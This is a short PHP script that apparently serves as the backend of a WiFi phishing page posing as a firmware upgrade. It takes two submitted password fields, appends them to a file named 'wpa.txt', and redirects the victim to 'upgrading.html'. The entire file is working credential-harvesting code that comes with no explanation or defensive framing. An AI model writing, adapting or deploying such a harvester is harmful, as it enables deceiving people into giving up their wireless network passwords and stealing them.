<?php
$password1 = $_REQUEST['password1'];
$password2 = $_REQUEST['password2'];
if($password1 != "" || $password2 != ""){
$file = fopen("wpa.txt", "a");
fwrite($file, "$password1 & $password2\n");
fclose($file);
echo "saved to wpa.txt <br>";
} else{
echo "empty";
}
header("Location: upgrading.html");
?>
